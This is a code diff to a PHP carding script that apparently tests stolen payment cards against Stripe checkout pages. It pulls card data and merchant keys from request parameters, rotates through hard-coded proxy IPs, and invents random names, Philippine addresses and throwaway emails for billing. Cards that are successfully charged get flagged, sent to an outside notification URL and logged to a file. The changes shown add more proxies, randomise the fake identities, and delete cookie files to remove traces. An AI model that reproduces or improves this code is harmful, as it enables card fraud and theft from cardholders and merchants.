@@ -3,21 +3,107 @@
 error_reporting(0);
 
 // Random information API
-$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
-$a = json_decode($resp);
-$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
-$name = $a->hello->person->first_name ?? "Alice";
-$lname  = $a->hello->person->last_name ?? "Schuberg";
-$phone      = $a->hello->person->phone;
-$ua         = $a->hello->person->ua;
-$street     = $a->hello->street->name ?? "314 alden ave";
-$city       = $a->hello->street->city ?? "rohnert park";
-$zip        = $a->hello->street->zip ?? "94928";
-$state      = $a->hello->street->state ?? "CA";
-$state_full = $a->hello->street->state_full ?? "California";
-$regionId   = $a->hello->street->regionId ?? "12";
-$country    = $a->hello->street->country ?? "United States";
-$fivenums   = rand(1000, 9999); // Generate 5 random numbers
+//$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
+//$a = json_decode($resp);
+//$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
+//$name = $a->hello->person->first_name ?? "Alice";
+//$lname  = $a->hello->person->last_name ?? "Schuberg";
+//$phone      = $a->hello->person->phone;
+//$ua         = $a->hello->person->ua;
+//$street     = $a->hello->street->name ?? "314 alden ave";
+//$city       = $a->hello->street->city ?? "rohnert park";
+//$zip        = $a->hello->street->zip ?? "94928";
+//$state      = $a->hello->street->state ?? "CA";
+//$state_full = $a->hello->street->state_full ?? "California";
+//$regionId   = $a->hello->street->regionId ?? "12";
+//$country    = $a->hello->street->country ?? "United States";
+//$fivenums   = rand(1000, 9999); // Generate 5 random numbers
+
+$first_names = array(
+    "Alice", "Bob", "Charlie", "David", "Emily", "Frank", "Grace", "Henry", "Isabella", "James", "Kate", "Liam", "Mia", "Nathan", "Olivia", "Peter", "Quentin", "Rachel", "Sophia", "Thomas", "Ursula", "Victoria", "William", "Xavier", "Yvette", "Zachary"
+);
+$last_names = array(
+    "Anderson", "Brown", "Clark", "Davis", "Edwards", "Ford", "Garcia", "Harris", "Irwin", "Jones", "Keller", "Lewis", "Martinez", "Nelson", "O'Brien", "Parker", "Quinn", "Rodriguez", "Smith", "Taylor", "Unger", "Valdez", "Williams", "Xu", "Young", "Zhang"
+);
+$complete_name = $first_names[array_rand($first_names)] . " " . $last_names[array_rand($last_names)];
+
+$cities = array(
+    'Quezon City',
+    'Manila',
+    'Caloocan',
+    'Davao City',
+    'Cebu City',
+    'Zamboanga City',
+    'Taguig',
+    'Pasig',
+    'Antipolo',
+    'Valenzuela',
+    'Las Pinas',
+    'Makati',
+    'Marikina',
+    'Muntinlupa',
+    'Navotas',
+    'Paranaque',
+    'Pasay',
+    'San Juan',
+    'Mandaluyong',
+    'Bacoor',
+    'Cainta',
+    'San Mateo',
+    'Imus',
+    'Dasmarinas',
+    'Silang',
+    'General Trias',
+    'Trece Martires',
+    'Tagaytay',
+    'Santa Rosa',
+    'Los Banos',
+    'San Pedro',
+    'Biñan',
+    'Calamba',
+    'Lipa',
+    'Batangas City',
+    'Tanauan',
+    'Santo Tomas',
+    'Laguna',
+    'Iloilo City',
+    'Bacolod City',
+    'Cagayan de Oro',
+    'General Santos',
+    'Iligan',
+    'Butuan',
+    'Ozamiz',
+    'Tacloban',
+    'Ormoc',
+    'Catarman',
+    'Naga',
+    'Legazpi'
+);
+$random_city = $cities[array_rand($cities)];
+
+$streets = array(
+    "Makati Avenue",
+    "Ayala Avenue",
+    "Buendia Avenue",
+    "EDSA",
+    "Pasay Road",
+    "Paseo de Roxas",
+    "Gil Puyat Avenue",
+    "Chino Roces Avenue",
+    "Taft Avenue",
+    "Shaw Boulevard",
+    "Ortigas Avenue",
+    "Quezon Avenue",
+    "Commonwealth Avenue",
+    "E. Rodriguez Avenue",
+    "C5 Road",
+    "SLEX",
+    "NLEX",
+    "Roxas Boulevard",
+    "Quirino Avenue",
+    "Araneta Avenue"
+);
+$random_street = $streets[array_rand($streets)];
 
 $sec = $_GET['cslive'];
 $pk = $_GET['pklive'];
@@ -30,10 +116,17 @@ $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
 $ips_accounts = array(
 1 =>    '104.234.11.110:8020',
         '172.86.123.167:8020',
-        '', //this is your default hosting server, so just leave it blank
         '157.254.195.104:8020',
+        '', //this is your default hosting server, so just leave it blank
         '166.0.94.105:8020',
-        '166.0.94.111:8020'
+        '45.147.228.20:8020',
+        '166.0.94.111:8020',
+        '', //this is your default hosting server, so just leave it blank
+        '188.191.106.251:8020',
+        '109.105.198.174:8020',
+        '85.208.107.228:8020',
+        '', //this is your default hosting server, so just leave it blank
+        '109.105.198.161:8020'
     );
 $rotateips = $ips_accounts[array_rand($ips_accounts)];
 $proxy = !empty($ip) ? $ip : ''.$rotateips.'';
@@ -41,7 +134,7 @@ $proxyauth = !empty($hydra) ? $hydra : '';
 
 $email2 = urlencode($email);
 if(empty($email)) {
-$email = 'aliceschuberg'.rand(0000, 9999).'@gmail.com';
+$email = 'phcaliceschuberg'.rand(0000, 9999).'@gmail.com';
 }
 $xemail = $email;
 
@@ -96,7 +189,11 @@ if (!empty($proxy)) {
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $ip = curl_exec($ch);
 $ips = g($ip,'"query":"','"');
-$myip = "<font class='text-white'>$ips</font><br>";
+if (!empty($ips)) {
+    $myip = "<font class='text-white'>$ips</font><br>";
+} else {
+$myip = "";
+}
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
@@ -191,7 +288,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
 curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]=hak&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.$street.'&billing_details[address][city]=Manila&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.$random_street.'&billing_details[address][city]='.$random_city.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
 $pm = curl_exec($ch);
 curl_close($ch);
 $id = g($pm, '"id": "','"');
@@ -413,7 +510,7 @@ if (strpos($final, '"status": "succeeded"')) {
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white">'.$cc.'|'.$mm.'|'.$yy.'</font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
+    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white"><b>'.$cc.'|'.$mm.'|'.$yy.'</b></font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
     fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
     }
 exit;
@@ -435,10 +532,10 @@ elseif(strpos($ppage2, '"message": "Your payment has already been processed."'))
     echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired</span><br>";
 }
 elseif($status == "requires_action"){
-    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site (Possible errors: [$dcode : $status])</span><br>";
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>";
 }
 elseif(strpos($ppage2, '"status": "requires_action"')){
-    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site (Possible errors: [$dcode : $status])</span><br>"; 
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site [$dcode : $status]</span><br>"; 
 }
 elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
     echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
@@ -453,10 +550,11 @@ elseif(strpos($ppage2, '"message": "An error has occurred confirming the Checkou
     
 }
 else {
-echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment Failed (Possible errors: [$code $decline_code $status $msg $dcode2 $message $dcode]</span><br>"; 
+echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment failed [$code $decline_code $status $msg $dcode2 $message $dcode]</span><br>"; 
     
     
 }
+
 // DELETE COOKIES AT IBA PANG MGA LIBAG
 if (is_file($cookies) && is_writable($cookies)) {
     unlink($cookies);
@@ -466,5 +564,14 @@ if (is_file($cookies) && is_writable($cookies)) {
     ob_end_flush();
 }
 
-?>
+// DELETE ALL TYPE OF FILES SA COOKIES FOLDER
+$dir = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR;
+$files = glob($dir . "*"); // get all files in the directory
 
+foreach($files as $file) {
+    if(is_file($file)) { // make sure it's a file and not a directory
+        unlink($file); // delete the file
+    }
+}
+
+?>
